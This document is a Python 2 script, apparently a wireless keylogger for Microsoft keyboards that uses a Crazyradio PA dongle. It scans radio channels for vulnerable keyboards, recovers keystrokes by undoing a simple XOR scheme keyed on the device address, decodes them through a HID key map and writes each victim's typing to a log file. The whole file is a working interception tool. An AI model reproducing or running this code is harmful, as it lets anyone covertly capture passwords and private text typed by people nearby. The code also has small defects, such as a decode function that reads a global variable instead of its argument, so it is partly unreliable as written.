#!/usr/bin/env python

import time, logging, random
from lib import common

hid_map = {
  0x04:  ['a','A'],
  0x05:  ['b','B'],
  0x06:  ['c','C'],
  0x07:  ['d','D'],
  0x08:  ['e','E'],
  0x09:  ['f','F'],
  0x0A:  ['g','G'],
  0x0B:  ['h','H'],
  0x0C:  ['i','I'],
  0x0D:  ['j','J'],
  0x0E:  ['k','K'],
  0x0F:  ['l','L'],
  0x10:  ['m','M'],
  0x11:  ['n','N'],
  0x12:  ['o','O'],
  0x13:  ['p','P'],
  0x14:  ['q','Q'],
  0x15:  ['r','R'],
  0x16:  ['s','S'],
  0x17:  ['t','T'],
  0x18:  ['u','U'],
  0x19:  ['v','V'],
  0x1A:  ['w','W'],
  0x1B:  ['x','X'],
  0x1C:  ['y','Y'],
  0x1D:  ['z','Z'],
  0x1E:  ['1','!'],
  0x1F:  ['2','@'],
  0x20:  ['3','#'],
  0x21:  ['4','$'],
  0x22:  ['5','%'],
  0x23:  ['6','^'],
  0x24:  ['7','&'],
  0x25:  ['8','*'],
  0x26:  ['9','('],
  0x27:  ['0',')'],
  0x28:  ['\n','\n'],
  0x29:  ['[ESC]', '[ESC]'],
  0x2A:  ['[BKSP]', '[BKSP]'],
  0x2B:  ['\t','\t'],
  0x2C:  [' ',' '],
  0x2D:  ['-','_'],
  0x2E:  ['=','+'],
  0x2F:  ['[','{'],
  0x30:  ['}','}'],
  0x31:  ['\\','|'],
  0x32:  ['#','-'],
  0x33:  [';',':'],
  0x34:  ['\'','"'],
  0x35:  ['`','~'],
  0x36:  [',','<'],
  0x37:  ['.','>'],
  0x38:  ['/','?'],
  0x39:  ['[CAPS]', '[CAPS]'],
  0x3A:  ['[F1]', '[F1]'],
  0x3B:  ['[F2]', '[F2]'],
  0x3C:  ['[F3]', '[F3]'],
  0x3D:  ['[F4]', '[F4]'],
  0x3E:  ['[F5]', '[F5]'],
  0x3F:  ['[F6]', '[F6]'],
  0x40:  ['[F7]', '[F7]'],
  0x41:  ['[F8]', '[F8]'],
  0x42:  ['[F9]', '[F9]'],
  0x43:  ['[F10]', '[F10]'],
  0x44:  ['[F11]', '[F11]'],
  0x45:  ['[F12]', '[F12]'],
  0x46:  ['[PrintScr]', '[PrintScr]']
  # ...etc. There are more on http://www.freebsddiary.org/APC/usb_hid_usages.php
}

ms_channels = [21, 23, 25, 46, 50, 56, 60, 72, 74, 78]


def decrypt(a, p):
  pay = p[:]
  for i in range(4, len(pay)):
    pay[i] ^= ord(a[(i - 4) % 5])
  return pay


def hid_decode(hid, meta):
  if key in hid_map:
    shift = 0
    if meta & 0x22:
      shift = 1
    return hid_map[key][shift]
  else:
    return ''


def checksum(p):
  p[-1] = 0
  for i in range(0, len(p) - 1):
    p[-1] ^= p[i]
  p[-1] = ~p[-1] & 0xff


def scan_for_keyboard(default_channel=0):
  print 'starting scan...'
  # Put the radio in promiscuous mode
  common.radio.enter_promiscuous_mode('')
  dwell_time = 0.2

  # Set the initial channel
  common.radio.set_channel(ms_channels[default_channel])

  # Sweep through the channels and decode ESB packets in pseudo-promiscuous mode
  last_tune = time.time()
  channel_index = default_channel
  
  while True:

    # Increment the channel
    if len(ms_channels) > 1 and time.time() - last_tune > dwell_time:
      channel_index = (channel_index + 1) % (len(ms_channels))
      common.radio.set_channel(ms_channels[channel_index])
      last_tune = time.time()

    # Receive payloads
    value = common.radio.receive_payload()
    if len(value) >= 5:

      # Split the address and payload
      address, payload = value[0:5], value[5:]
      
      pay_string = ':'.join('{:02X}'.format(b) for b in payload)
      addr_string = ':'.join('{:02X}'.format(b) for b in address)

      print 'got packet - ch: %02d addr: %s p: %s' % (ms_channels[channel_index], addr_string, pay_string)
      # hack to wait on channel
      last_tune = time.time() + 5.0

      payload = decrypt(addr_string.replace(':', '').decode('hex')[::-1][:5], payload)
      print payload

      if len(payload) > 9 and payload[0] == 0x0A and payload[1] == 0x78:
        print "found vulnerable MS keyboard on channel %d, address: %s" % (ms_channels[channel_index], addr_string)
        return (addr_string, channel_index)


# Parse command line arguments and initialize the radio
common.init_args('./keylogger.py')
common.parser.add_argument('-t', '--timeout', type=float, help='Rescan timeout is seconds', default=60)
common.parse_and_init()

# Assume Crazyradio PA
common.radio.enable_lna()

# Set timeout
timeout = common.args.timeout

# Sweep through the channels and decode ESB packets in pseudo-promiscuous mode
last_ping = 0
active_channel = 0

while True:
  if (time.time() - last_ping) > timeout:
    address_string, active_channel = scan_for_keyboard(active_channel)
    address = address_string.replace(':', '').decode('hex')[::-1][:5]
    common.radio.enter_sniffer_mode(address)
    last_ping = time.time()
    seq = 0
    last_key = 0

  # Receive payloads
  value = common.radio.receive_payload()
  if value[0] == 0:

    # Reset the channel timer
    last_ping = time.time()

    # Split the payload from the status byte
    payload = value[1:]

    # Check if it's a keystroke packet
    if payload[0] == 0x0A and payload[1] == 0x78:
      # Check if it's a duplicate
      
      payload = decrypt(address, payload)
      new_seq = (payload[5] << 8) + payload[4]

      if new_seq < seq and (seq - new_seq) > 1000:
        print "sequence numbers wrapped - oseq: %d nseq: %d" % (seq, new_seq)
        seq = new_seq - 1

      elif new_seq < seq:
        key = payload[9]
        if key != last_key:
          print "missed key? oseq: %d nseq: %d key: %s" % (seq, new_seq, hid_decode(key, payload[7]))

      if new_seq > seq:

        seq = new_seq
        key = payload[9]
        
        if not (key == last_key and (payload[10] or payload[11])):

          last_key = key
          letter = hid_decode(key, payload[7])

          if letter:
            print "addr: %s seq: %d key: %s" % (address_string, seq, letter)
            with open("log/%s-key.log" % address_string, 'a') as f:
              f.write(letter)
